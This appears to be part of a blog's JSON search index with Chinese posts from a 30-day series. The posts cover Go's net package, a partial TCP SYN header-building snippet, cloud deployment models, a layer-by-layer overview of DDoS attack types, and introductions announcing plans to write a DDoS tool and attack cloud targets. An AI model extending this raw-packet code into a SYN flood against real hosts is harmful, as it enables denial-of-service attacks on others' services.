可以看出Dial支援多種傳輸類型；也可以使用host代替ip targetIP也可以使用\u0026quot;example.com\u0026quot;等hostname\nTCP SYN 封包 接下來建立TCP SYN封包 來源\nSource Port(16 bits/2 bytes): 來源端口號 Destination Port(16 bits/2 bytes): 目的端口號 Sequence Number(32 bits/4 bytes): 3次握手建立連結後，建立一個隨機初始序列號/起始數據位，隨後按傳輸的字節數遞增。 Acknowledgment Number(32 bits/4 bytes): 預測下一個TCP的序列號。 Header length field(4 bits): 標示TCP Header大小。 Reserved bits(6 bits): 設置為0，保留供以後使用。 Flag bits(6 bits): 包括SYN、ACK、RST、FIN、URG和PSH等標籤。 Window Size(16 bits/2 bytes): 指定接收端的窗口大小，用於流量控制。 Checksum(16 bits/2 bytes): 校驗TCP Header與Data的完整性。 Urgent Pointer(16 bits/2 bytes): 只有設定URG標示才會使用。 Options/optional data(0-40 Bytes):包含可選訊息。可不寫，所以TCP Header總大小在20~60 建立TCP Header 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 seqNum := uint32(123456) flags := uint16(0x02) // TCP SYN標籤 // TCP Header tcpHeader := make([]byte, 20) tcpHeader[0] = byte(srcPort \u0026gt;\u0026gt; 8) tcpHeader[1] = byte(srcPort) tcpHeader[2] = byte(dstPort \u0026gt;\u0026gt; 8) tcpHeader[3] = byte(dstPort) tcpHeader[4] = byte(seqNum \u0026gt;\u0026gt; 24) tcpHeader[5] = byte(seqNum \u0026gt;\u0026gt; 16) tcpHeader[6] = byte(seqNum \u0026gt;\u0026gt; 8) tcpHeader[7] = byte(seqNum) tcpHeader[13] = byte(flags \u0026gt;\u0026gt; 8) tcpHeader[12] = byte(flags) 好像缺了什麼？明天繼續\n","date":"2023-09-16T00:00:00Z","permalink":"http://localhost:1313/p/day-3-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B%E5%B0%B1%E6%89%BE%E5%A5%97%E4%BB%B6-go%E5%8E%9F%E7%94%9F%E5%A5%97%E4%BB%B6net/","title":"[Day 3] 閑的沒事就找套件 - Go原生套件'net'"},{"content":"雲端運算（Cloud Compute） 什麼是雲端運算 使用者利用遠端主機的資源，來實現資料庫、伺服器、儲存空間、分析等運算服務。雲端供應商藉由虛擬化技術取代實體硬體設備，使用者不必花費硬體採購及維護費用，加上可依據規模的高彈性使用，使得近期雲端大受歡迎。\n來源\n三大類雲端運算部署模式 根據使用者的需求，發展出對應的部署模式與服務模式，先來介紹三大部署模式\n公有雲（Public Cloud） 什麼是公有雲？\n由第三方供應商提供的雲端運算服務 通常都是多租戶、多的組織、多的使用者可以共享相同的基礎架構及資源，但基礎架構跟資源都是隔離的，不會互相干擾。 公有雲例子：\nGmail Google Drive AWS EC2 優點\n通常以流量計算，可以避免硬體及擴充上的成本 可擴展性佳 全球範圍皆可適用，公有雲供應商大多會提供cloud cdn服務 易於管理，包含自動管理及維護 快速部署服務 缺點：\n依賴於雲端供應商 安全性及隱私不佳 私有雲（Private Cloud） 什麼是私有雲？\n企業自行建置伺服器所打造的私人雲端基礎架構，ex: 企業自己建立機房設定虛擬機服務，並建立架構。 享有更多的隱私及控制權，但通常伴隨著更高的成本及複雜性 私有雲例子：\n企業私有雲、政府機關私有雲、金融機構私有雲 優點\n獨立基礎設施 控制及安全性 合規性 缺點：\n初始成本高，維護成本更高 受限物理硬體容量，難以實現公有雲的靈活性 非專業人員可能有建構或管理上的問題 混合雲（Hybrid Cloud） 什麼是混合雲？\n透過網路連接公有雲及私有雲，同時享有公有雲的優點跟私有雲的優點 主要優勢在於兼顧的資料的彈性及安全性，但也需要處理需要處理複雜的管理及整合。 優點：\n兼顧資料安全性與靈活調度資源 結合公有雲及私有雲優點 缺點：\n混合雲環境複雜，須考慮不同雲環境的集合、數據處理及安全性 額外的投資成本，包含設備、管理及培訓 整合挑戰高，當需要跨雲環境交流及協同工作時 安全風險不足，需要仔細考慮數據保護及存取控制 ","date":"2023-09-15T00:00:00Z","permalink":"http://localhost:1313/p/day-2-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-%E4%B8%89%E5%A4%A7%E9%9B%B2%E7%AB%AF%E9%81%8B%E7%AE%97%E9%83%A8%E7%BD%B2%E9%A1%9E%E5%9E%8B/","title":"[Day 2] 天堂雲端-三大雲端運算部署類型"},{"content":"什麼是DDOS 分散式阻斷服務（Distributed Denial of Service），主要是通過製造大流量來攻擊特定服務器或基礎設施，以阻斷正常流量，中斷用戶與服務器或應用程序的連接，造成流量阻塞。\n什麼是DOS？ 這個很多人都會搞混，DOS（Denial of Service），同樣是大規模封包攻擊特定服務器或基礎設施，但由於是單一來源，攻擊規模較小，而且一旦識別出IP後，即可阻止攻擊。\n因此，DDOS可以當作分布式的DOS。DDOS發送的封包會更複雜更多樣化，以避免用戶封鎖特定IP或特定協議來阻擋攻擊。DDOS攻擊可以針對OSI模型的不同層發起不同類型的攻擊。 來源\n第一層 Physical Layer 這一層的攻擊主要是物理攻擊，例如說切斷網絡連接、摧毀網絡設備、割斷電纜等。跟主題無關。\n第二層 Data Link Layer 攻擊會針對網路交換器、橋接器、或其他設備進行攻擊。可能通過MAC Spoofing、ARP Spoofing或利用數據鏈路協議漏洞來導致網絡連接中斷或混亂。 行為：MAC Spoofing、ARP Spoofing\n第三層 Network Layer Network layer攻擊包括ICMP Flood、Fragment Packet Flood和Route Attack。 行為：ICMP Flood、Fragment Packet Flood、Route Attack\n第四層 Transport Layer 這一層攻擊主要針對TCP、UDP協定，包括SYN Flood、UDP Flood、RST Attack等，試圖耗盡目標系統的連接資源或混淆傳輸協議以干擾正常通信。 行為：SYN Flood、UDP Flood、RST Attack、Reflection Attack\n第五層 Session Layer 這些攻擊針對Session Layer會話和通信，如HTTP Flood、SSL/TLS Flood。攻擊者可能試圖使目標網站無法處理用戶的請求或使安全通信協議無法建立。 行為：HTTP Flood、SSL/TLS Flood\n第六層 Presentation Layer 利用Presentation Layer協議漏洞來造成損害，但通常會依據依賴的程式碼，所以並不常見。例如說：加密漏洞、數據解碼漏洞等。\n第七層 Application Layer Application Layer攻擊是最常見的DDoS攻擊類型，包括HTTP Flood、DNS Flood、SMTP Flood等。攻擊者通常針對特定應用程式及服務，試圖使其無法正常運作。 行為：HTTP Flood、DNS Flood、SMTP Flood、Amplification Attack\n","date":"2023-09-15T00:00:00Z","permalink":"http://localhost:1313/p/day-2-%E9%96%91%E8%91%97%E6%B2%92%E4%BA%8B%E5%B0%B1ddos-%E4%BB%80%E9%BA%BC%E6%98%AFddos/","title":"[Day 2] 閑著沒事就DDOS - 什麼是DDOS"},{"content":"鐵人賽開賽前言 其實這是我今年7月就準備寫的一個side project，結果拖到了現在一個code都沒有寫好。 今年7月我寫了一個Go的併發爬蟲專案，併發爬蟲並丟到資料庫，跑了一個超快超迅速，沒有特定釋出memory的情況下還不吃memory，然後我就突然愛上Go了。我原本有用python寫關於底層封包設定，後來想想，既然要寫DDOS，代表說機器丟封包可能需要丟得越快越好，然後我就決定改用Go寫。然後我就拖到現在都沒寫，還去參加了救生員訓練，delay了3個禮拜\n大綱 整個鐵人賽程的大綱就是，我為什麼要寫這個？寫這個有什麼作用？我為什麼要在這裡？\n碎碎念 基於我還沒有動筆的原因，其實我也不太確定能不能寫好寫滿30天。而且中間架構我該不會會改來改去之類的。但主題是SideProject30，我寫side project的時候可能看到別人好的架構或是好的封裝或是用到好用的套件我就會把整個都改一遍，有空的話還會寫benchmark證明一下我為什麼要改，因為經驗不足的原因，看到好用的我都想用用看。希望大家包容一下~\n","date":"2023-09-14T00:00:00Z","permalink":"http://localhost:1313/p/day-1-ddos%E9%96%8B%E8%B3%BD%E5%89%8D%E8%A8%80/","title":"[Day 1] DDOS開賽前言"},{"content":"鐵人賽開賽前言 不例外的第一天先來介紹一下接下來地獄30天會寫什麼。題目是雲端攻擊，但是還沒建立雲端環境（對我沒有現成的）哪來的target來攻擊？所以接下來的鐵人30天讓我們一起建構ㄧ套雲端架構然後再把它打掉。\n大綱 先介紹雲服務種類架構，再來是一般架構/雲端架構、上雲優缺點。既然要上雲了，那雲供應商提供的安全性跟使用者需要自己注意的安全性是如何分攤？把前情提要都介紹完了後，那我們開始建立靶機跟POC\n為什麼想要寫這個主題 雲端攻擊算是最近我有在研究的方向，雲端架構脫胎於一般落地架構，所以前面幾個章節會先大概講一下雲的基礎知識跟使用開源套件建立的架構，再來雲端架構，然後是雲端攻擊。因為我並不是專業的雲端架構師，所以對於雲端架構方面可能不是很專業的那種，但本次鐵人賽目的是建起來再打掉，所以並不會在雲端架構上面有多琢磨。 前面對於一些已經有雲端服務知識的人可能感覺沒什麼好看的，可以等到後面POC再回來。\n","date":"2023-09-14T00:00:00Z","permalink":"http://localhost:1313/p/day-1-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF%E5%BE%9E%E9%96%8B%E5%A7%8B%E5%88%B0%E6%8E%A5%E7%AE%A1-%E9%90%B5%E4%BA%BA%E8%B3%BD%E9%96%8B%E8%B3%BD/","title":"[Day 1] 天堂雲端從開始到接管-鐵人賽開賽"}]